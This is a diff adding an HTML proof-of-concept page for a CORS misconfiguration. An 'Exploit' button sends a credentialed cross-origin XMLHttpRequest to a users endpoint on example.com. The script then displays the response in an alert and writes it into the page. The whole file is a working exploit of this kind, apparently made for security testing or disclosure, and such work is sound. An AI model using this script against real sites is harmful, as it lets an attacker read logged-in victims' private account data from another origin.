@@ -1,0 +1,43 @@
+<html>
+
+  <body>
+
+  <h2>CORS Proof of Concept</h2>
+
+  <div id="demo">
+    <button id="exploitButton" type="button">Exploit</button>
+  </div>
+
+  <script>
+    document.getElementById("exploitButton").addEventListener("click", cors);
+    
+    function cors() {
+      var xhr = new XMLHttpRequest();
+      xhr.onreadystatechange = function() {
+        if (this.readyState === 4) {
+          if (this.status === 200) {
+            alert("Response: " + this.responseText); // Show alert with response
+            // Alternatively, update the inner HTML
+            document.getElementById("demo").innerHTML = this.responseText;
+          } else {
+            alert("Error: " + this.status + " " + this.statusText); // Handling errors
+          }
+        }
+      };
+
+      xhr.open("GET", "https://example.com/v1/uopbedq/c/users", true);
+      
+      // Set custom headers after open - optional
+      // Access-Control-Allow-Headers: Authorization,content-type,api-version
+      // CORS can only take place from cookie based session management, not any header based.
+      xhr.setRequestHeader("Content-Type", "application/json");
+      xhr.setRequestHeader("api-version", "v1");
+
+      xhr.withCredentials = true; // Specifies whether to include credentials in cross-origin requests
+      xhr.send();
+    }
+  </script>
+
+</body>
+
+</html>
